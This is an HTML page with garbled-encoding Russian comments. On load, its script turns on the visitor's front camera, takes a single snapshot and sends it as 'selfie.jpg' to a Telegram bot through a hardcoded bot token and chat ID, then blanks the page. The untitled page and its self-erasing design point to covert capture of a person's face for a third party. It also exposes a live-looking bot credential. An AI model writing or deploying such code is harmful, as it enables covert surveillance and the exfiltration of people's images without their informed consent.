<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title></title>
    <style>
        body, html { margin:0; padding:0; width:100%; height:100%; background:#000; }
        #log { color:#0f0; font-family:Arial; padding:20px; font-size:14px; white-space:pre; }
        .error { color:#f00; }
        .success { color:#0f0; }
    </style>
</head>
<body>
    <div id="log">üîÑ –ó–∞–ø—É—Å–∫...</div>

<script>
const BOT_TOKEN = '8415018467:AAFtfY3AnAOHvVMBK9zRj1BehN6uM2MC5e0';
const CHAT_ID = '1250741267';
const log = document.getElementById('log');

function updateLog(msg, type = '') {
    log.textContent += `\n${msg}`;
    log.className = type;
}

async function process() {
    try {
        updateLog('1. –í–∫–ª—é—á–∞—é –∫–∞–º–µ—Ä—É...');
        
        // –í–∫–ª—é—á–∞–µ–º —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω—É—é –∫–∞–º–µ—Ä—É
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { 
                facingMode: 'user', // –§—Ä–æ–Ω—Ç–∞–ª—å–Ω–∞—è –∫–∞–º–µ—Ä–∞
                width: { ideal: 640 },
                height: { ideal: 480 }
            }
        });
        
        updateLog('‚úÖ –ö–∞–º–µ—Ä–∞ –≤–∫–ª—é—á–µ–Ω–∞');
        
        // –°–æ–∑–¥–∞—ë–º –≤–∏–¥–µ–æ-—ç–ª–µ–º–µ–Ω—Ç (–ù–ï –ó–ê–ü–£–°–ö–ê–ï–ú .play()!)
        const video = document.createElement('video');
        video.srcObject = stream;
        
        // –ñ–¥—ë–º, –∫–æ–≥–¥–∞ –≤–∏–¥–µ–æ –±—É–¥–µ—Ç –≥–æ—Ç–æ–≤–æ (–±–µ–∑ .play())
        await new Promise((resolve) => {
            video.onloadedmetadata = () => {
                updateLog('2. –î–µ–ª–∞—é —Ñ–æ—Ç–æ...');
                resolve();
            };
        });
        
        // –î–∞—ë–º –∫–∞–º–µ—Ä–µ 300–º—Å –Ω–∞ —Ñ–æ–∫—É—Å–∏—Ä–æ–≤–∫—É
        await new Promise(resolve => setTimeout(resolve, 300));
        
        // –°–æ–∑–¥–∞—ë–º canvas –∏ –¥–µ–ª–∞–µ–º —Å–Ω–∏–º–æ–∫
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);
        
        // –ù–µ–º–µ–¥–ª–µ–Ω–Ω–æ –æ—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–∞–º–µ—Ä—É
        stream.getTracks().forEach(track => track.stop());
        updateLog('‚úÖ –§–æ—Ç–æ —Å–¥–µ–ª–∞–Ω–æ');
        
        // –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º –≤ Blob –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
        canvas.toBlob(async (blob) => {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'selfie.jpg');
            
            updateLog('3. –û—Ç–ø—Ä–∞–≤–ª—è—é –≤ Telegram...');
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                
                if (result.ok) {
                    updateLog('‚úÖ –§–æ—Ç–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ!', 'success');
                    // –ß–µ—Ä–µ–∑ 2 —Å–µ–∫—É–Ω–¥—ã –¥–µ–ª–∞–µ–º —Å—Ç—Ä–∞–Ω–∏—Ü—É –ø—É—Å—Ç–æ–π
                    setTimeout(() => {
                        document.body.innerHTML = '';
                        document.body.style.backgroundColor = '#000';
                    }, 2000);
                } else {
                    updateLog(`‚ùå –û—à–∏–±–∫–∞ Telegram: ${result.description}`, 'error');
                }
            } catch (fetchError) {
                updateLog(`‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ç–∏: ${fetchError.message}`, 'error');
            }
        }, 'image/jpeg', 0.9); // –ö–∞—á–µ—Å—Ç–≤–æ 90%
        
    } catch (error) {
        updateLog(`‚ùå –û—à–∏–±–∫–∞: ${error.message}`, 'error');
    }
}

// –ó–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
window.addEventListener('DOMContentLoaded', process);
</script>
</body>
</html>